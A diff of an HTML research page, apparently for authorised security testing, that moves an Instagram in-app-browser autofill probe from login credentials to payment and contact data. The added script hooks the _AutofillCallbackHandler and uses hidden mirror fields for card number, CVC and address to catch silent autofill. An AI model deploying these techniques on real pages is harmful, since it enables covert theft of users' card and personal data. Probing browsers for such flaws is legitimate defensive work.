@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Sign in</title>
+<title>Checkout</title>
 <style>
  body{margin:0;font-family:-apple-system,system-ui,Arial,sans-serif;padding:14px;line-height:1.45;color:#111}
  h1{font-size:16px}h2{font-size:12px;margin:12px 0 4px;color:#333}
@@ -15,69 +15,71 @@
 </style>
 </head>
 <body>
-<h1>Benign IAB autofill test</h1>
-<p style="font-size:12px;color:#666">Authorized research. Use your OWN Instagram test account with a
-FAKE saved credential (e.g. password <code>AUTOFILL-PWN-TEST</code>). This page only reads what gets
-filled into ITS OWN fields and logs the autofill callback — it proves capability with benign markers,
-not real data. Open inside the Instagram in-app browser.</p>
+<h1>Benign IAB payment/contact autofill test</h1>
+<p style="font-size:12px;color:#666">Authorized research. Use your OWN Instagram test account with
+FAKE saved payment/contact data (test card <b>4111 1111 1111 1111</b>, name <b>AUTOFILL PWN TEST</b>,
+fake address). This page hooks the autofill callback and reads what gets filled into ITS OWN fields —
+proving capability with benign markers, NOT real data. Open inside the Instagram in-app browser.</p>
 
-<h2>visible login form (tap fields; accept IG autofill if offered)</h2>
-<form id="f" onsubmit="return false">
- <input id="u" name="username" autocomplete="username" placeholder="username">
- <input id="p" name="password" type="password" autocomplete="current-password" placeholder="password">
+<h2>payment form (tap a field; accept IG autofill if offered)</h2>
+<form onsubmit="return false" autocomplete="on">
+ <input id="ccname" name="ccname" autocomplete="cc-name" placeholder="name on card">
+ <input id="ccnum"  name="cardnumber" autocomplete="cc-number" inputmode="numeric" placeholder="card number">
+ <input id="ccexp"  name="cc-exp" autocomplete="cc-exp" placeholder="MM/YY">
+ <input id="cccsc"  name="cvc" autocomplete="cc-csc" inputmode="numeric" placeholder="CVC">
 </form>
 
-<!-- hidden fields to test silent exfil -->
+<h2>contact form</h2>
+<form onsubmit="return false" autocomplete="on">
+ <input id="name" name="name" autocomplete="name" placeholder="full name">
+ <input id="tel"  name="tel" autocomplete="tel" inputmode="tel" placeholder="phone">
+ <input id="addr" name="street-address" autocomplete="street-address" placeholder="address">
+</form>
+
+<!-- hidden mirror fields to test silent / all-frames distribution -->
 <div class="hidden" aria-hidden="true">
- <input id="hu" name="username" autocomplete="username">
- <input id="hp" name="password" type="password" autocomplete="current-password">
+ <input id="hccnum" name="cardnumber" autocomplete="cc-number">
+ <input id="hcccsc" name="cvc" autocomplete="cc-csc">
+ <input id="haddr"  name="street-address" autocomplete="street-address">
 </div>
 
-<button onclick="readNow()">read field values now</button>
-<button onclick="dumpCb()">dump _AutofillCallbackHandler source</button>
-
-<h2>log</h2><pre id="log"></pre>
+<button onclick="readNow()">read all field values now</button>
+<h2>log (hooked _AutofillCallbackHandler payloads)</h2><pre id="log"></pre>
+<p class="warn">Own test account + FAKE data only. Prove capability (read the fake card), never real data.</p>
 
 <script>
 function g(id){return document.getElementById(id);}
 var L=g('log'); function log(m){ L.textContent += m + '\n'; }
+function safe(x){ try{return JSON.stringify(x).slice(0,800);}catch(e){try{return String(x).slice(0,400);}catch(_){return '(unser)';}} }
 
-// origin context
-log('origin='+location.origin+' domain='+document.domain);
-log('IG app='+/Instagram/i.test(navigator.userAgent));
-log('__IABAutofillAPIBridgeAlreadyInitialized='+window.__IABAutofillAPIBridgeAlreadyInitialized);
-log('autofillWindowId='+window.autofillWindowId);
+log('origin='+location.origin+' IG='+/Instagram/i.test(navigator.userAgent));
 
-// (c) HOOK the autofill callback (benign interception test) — if the page can wrap it and native
-// still calls it with data, the page can observe autofill payloads. We only LOG, then pass through.
-try{
-  if(typeof window._AutofillCallbackHandler==='function'){
-    var orig = window._AutofillCallbackHandler;
-    window._AutofillCallbackHandler = function(){
-      try{ log('>>> _AutofillCallbackHandler CALLED with: '+JSON.stringify([].slice.call(arguments)).slice(0,600)); }catch(e){ log('cb log err '+e); }
-      try{ return orig.apply(this, arguments); }catch(e){ log('orig cb err '+e); }
-    };
-    log('hooked _AutofillCallbackHandler (will log native-delivered autofill data)');
-  } else { log('_AutofillCallbackHandler not a function this load'); }
-}catch(e){ log('hook err '+e); }
+// Hook the native->page autofill callback to capture payment/contact payloads (r = values).
+function hookCb(){
+  try{
+    if(typeof window._AutofillCallbackHandler==='function' && !window.__hooked){
+      var orig=window._AutofillCallbackHandler;
+      window._AutofillCallbackHandler=function(e,n,r,a){
+        try{ log('>>> AutofillCallback action='+a+'  r='+safe(r)); }catch(_){}
+        try{ return orig.apply(this,arguments); }catch(err){ log('orig err '+err); }
+      };
+      window.__hooked=true; log('hooked _AutofillCallbackHandler');
+    }
+  }catch(e){ log('hook err '+e); }
+}
+hookCb();
+// autofill callback may (re)load after form detection — re-hook periodically
+var hk=setInterval(hookCb, 500); setTimeout(function(){clearInterval(hk);}, 15000);
 
-// (b) watch hidden fields for silent fill
-['hu','hp'].forEach(function(id){ g(id).addEventListener('input', function(){ log('HIDDEN '+id+' filled = '+g(id).value); }); });
-['u','p'].forEach(function(id){ g(id).addEventListener('input', function(){ log('visible '+id+' = '+g(id).value); }); });
+// watch hidden mirrors for silent fill
+['hccnum','hcccsc','haddr'].forEach(function(id){ g(id).addEventListener('input', function(){ log('HIDDEN '+id+' filled = '+g(id).value); }); });
 
 function readNow(){
   log('--- read ---');
-  log('visible username = '+g('u').value);
-  log('visible password = '+g('p').value);
-  log('HIDDEN username = '+g('hu').value);
-  log('HIDDEN password = '+g('hp').value);
-  log('(if HIDDEN got a value you never typed = silent autofill exfil)');
-}
-function dumpCb(){
-  try{ log('--- _AutofillCallbackHandler source ---'); log(String(window._AutofillCallbackHandler)); }catch(e){ log('err '+e); }
-  // also re-check autofill-related globals + any messageHandler the autofill might use
-  var af=[]; for(var k in window){ try{ if(/autofill|iab/i.test(k)) af.push(k+':'+typeof window[k]); }catch(e){} }
-  log('autofill globals: '+af.join(', '));
+  ['ccname','ccnum','ccexp','cccsc','name','tel','addr','hccnum','hcccsc','haddr'].forEach(function(id){
+    var v=g(id).value; if(v) log(id+' = '+v);
+  });
+  log('(any HIDDEN field with a value you never typed = silent autofill exfil)');
 }
 </script>
 </body>
